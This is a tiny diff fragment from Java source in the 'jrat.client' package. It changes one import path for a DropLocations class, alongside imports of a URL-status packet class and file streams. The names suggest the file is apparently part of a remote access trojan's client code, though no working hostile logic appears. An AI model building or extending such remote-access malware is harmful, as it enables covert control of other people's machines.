@@ -1,6 +1,6 @@
 package jrat.client;
 
-import io.jrat.common.DropLocations;
+import jrat.common.DropLocations;
 import jrat.client.packets.outgoing.Packet27URLStatus;
 import java.io.File;
 import java.io.FileOutputStream;
